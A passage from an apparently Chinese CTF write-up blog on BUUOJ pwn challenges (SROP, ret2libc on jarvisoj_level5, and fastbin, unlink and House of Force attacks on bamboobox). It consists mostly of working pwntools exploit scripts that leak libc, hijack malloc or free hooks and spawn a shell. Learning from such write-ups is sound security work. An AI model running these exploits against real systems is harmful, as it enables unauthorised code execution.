class="line">frame.rdx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(offset, <span class="string">b&#x27;\x00&#x27;</span>) + p64(mov_rax_15) + p64(syscall_addr) + <span class="built_in">bytes</span>(frame))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/06/Sz148MWw2GbLoce.png" alt="image.png"></p>
<blockquote>
<p>远程的栈和本地的栈好像还不大一样…最好选择相同版本的系统进行调试</p>
</blockquote>
<h2 id="0x045-jarvisoj-level5-ret2csu-ret2libc"><a href="#0x045-jarvisoj-level5-ret2csu-ret2libc" class="headerlink" title="0x045.jarvisoj_level5 - ret2csu + ret2libc"></a>0x045.jarvisoj_level5 - ret2csu + ret2libc</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/04/06/R4TLerujoW2yn1U.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有一个很大的溢出</p>
<p><img src="https://i.loli.net/2021/04/06/J2BYlvZwmiDtspx.png" alt="image.png"></p>
<p>套板子 ret2libc 即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26872</span>)<span class="comment">#process(&#x27;./level3_x64&#x27;) # </span></span><br><span class="line">e=  ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_r15_ret = e.search(asm(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(e.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/06/zM7Ky1pP2WFlsLq.png" alt="image.png"></p>
<h2 id="0x046-hitcontraining-bamboobox-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><a href="#0x046-hitcontraining-bamboobox-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force" class="headerlink" title="0x046.hitcontraining_bamboobox - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force"></a>0x046.hitcontraining_bamboobox - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</h2><p>惯例的 <code>checksec</code> ，保护全…只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/04/06/u1tz4knpvFIU6YE.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大概是一道有着分配、释放、编辑、打印堆块功能的堆题</p>
<p> 漏洞点在于编辑时未对长度进行检查，存在<strong>堆溢出</strong></p>
<p><img src="https://i.loli.net/2021/04/06/sQWAijDXVY5zZH1.png" alt="image.png"></p>
<p>需要注意的是无论是创建堆块还是编辑堆块都有一个 <code>&#39;\0&#39;</code> 截断</p>
<h3 id="解法一：Fastbin-Attack-one-gadget"><a href="#解法一：Fastbin-Attack-one-gadget" class="headerlink" title="解法一：Fastbin Attack + one_gadget"></a>解法一：Fastbin Attack + one_gadget</h3><p>基本上是套板子做题，算是堆题的通法了，realloc调栈，构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29469</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + <span class="number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/06/ezYrE2R1X9JdQxk.png" alt="image.png"></p>
<blockquote>
<p>本地的栈调了我半天，远程栈不一样又调了半天…</p>
</blockquote>
<h3 id="解法二：Unlink"><a href="#解法二：Unlink" class="headerlink" title="解法二：Unlink"></a>解法二：Unlink</h3><p>没开地址随机化，那就比较常规地用 unlink 劫持指针数组即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25366</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">heap_array = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 7</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>,<span class="number">0x30</span> , p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heap_array + <span class="number">0x68</span> - <span class="number">0x18</span>) + p64(heap_array + <span class="number">0x68</span> - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>))</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">b&#x27;arttnba3&#x27;</span> + p64(heap_array + <span class="number">0x50</span>))</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">8</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/08/t1I9OGLFlXPapzo.png" alt="image.png"></p>
<h3 id="解法三：House-of-Force"><a href="#解法三：House-of-Force" class="headerlink" title="解法三：House of Force"></a>解法三：House of Force</h3><p>有堆溢出，创建堆块时不限制大小，那就改 top chunk size 以后通过整型溢出使得 top chunk 分配到前面的chunk，形成overlapping（<del>但是都有堆溢出了还需要这样的方式构造 chunk overlapping🦄</del>）</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25366</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)#</span></span><br><span class="line">heap_array = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 7</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span 